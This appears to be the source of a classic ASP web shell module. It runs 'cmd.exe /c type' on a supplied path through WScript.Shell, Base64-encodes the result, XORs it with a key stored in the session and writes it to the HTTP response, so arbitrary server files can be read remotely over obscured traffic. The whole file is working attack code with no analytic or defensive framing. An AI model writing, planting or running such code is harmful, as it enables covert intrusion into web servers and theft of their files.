Function Encrypt(data)
key=Session("k")
size=len(data)
For i=1 To size
encryptResult=encryptResult&chrb(asc(mid(data,i,1)) Xor Asc(Mid(key,((i - 1 + 5) And 15)+1,1)))
Next
Encrypt=encryptResult
End Function

Function Stream_StringToBinary(Text)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "utf-8"
  BinaryStream.Open
  BinaryStream.WriteText Text
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeBinary
  BinaryStream.Position = 0
  Stream_StringToBinary = BinaryStream.Read
  Set BinaryStream = Nothing
End Function

Function Base64Encode(sText)
  Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
  Set oNode = oXML.CreateElement("base64")
  oNode.dataType = "bin.base64"
  oNode.nodeTypedValue = Stream_StringToBinary(sText)
  If Mid(oNode.text,1,4)="77u/" Then oNode.text=Mid(oNode.text,5)
  Base64Encode = Replace(oNode.text, vbLf, "")
  Set oNode = Nothing
  Set oXML = Nothing
End Function

Function ShellQuote(value)
  ShellQuote = """" & Replace(value, """", """""") & """"
End Function

Function ReadTextFile(path)
  On Error Resume Next
  Set ws = Server.CreateObject("WScript.Shell")
  Set process = ws.Exec("cmd.exe /c type " & ShellQuote(path))
  ReadTextFile = process.StdOut.ReadAll & process.StdErr.ReadAll
  If Err.Number <> 0 Then
    ReadTextFile = Err.Description
    Err.Clear
  End If
End Function

Sub main(path)
  Response.binarywrite(Encrypt(Base64Encode(ReadTextFile(path))))
End Sub
